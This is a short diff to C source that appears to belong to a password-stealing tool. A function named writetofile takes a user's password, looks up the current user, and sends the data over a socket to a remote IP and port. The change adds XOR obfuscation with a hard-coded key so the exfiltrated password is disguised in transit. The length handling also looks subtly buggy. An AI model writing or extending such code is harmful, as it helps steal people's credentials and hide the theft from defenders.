@@ -8,10 +8,22 @@
 #define PORT
 #define IP
 
+char *XORCipher(char *data, char *key, int dataLen, int keyLen)
+{
+    char *output = (char *)malloc(sizeof(char) * dataLen);
+
+    for (int i = 0; i < dataLen; ++i)
+    {
+        output[i] = data[i] ^ key[i % keyLen];
+    }
+
+    return output;
+}
+
 int writetofile(char *password)
 {
 
-    /* Get UID */
+    /* Get uid */
     uid_t uid = geteuid();
     struct passwd *pw = getpwuid(uid);
 
@@ -72,8 +84,14 @@ int writetofile(char *password)
         return -1;
     }
 
+    /* Encrypt Message */
+    char *key = "KEY_HERE";
+    int key_length = strlen(key);
+    int mes_length = strlen(buffer);
+    char *xor_message = XORCipher(password, key, mes_length, key_length);
+
     /* Send Message */
-    send(sock, buffer, strlen(buffer), 0);
+    send(sock, xor_message, strlen(xor_message), 0);
 
     return 0;
 }
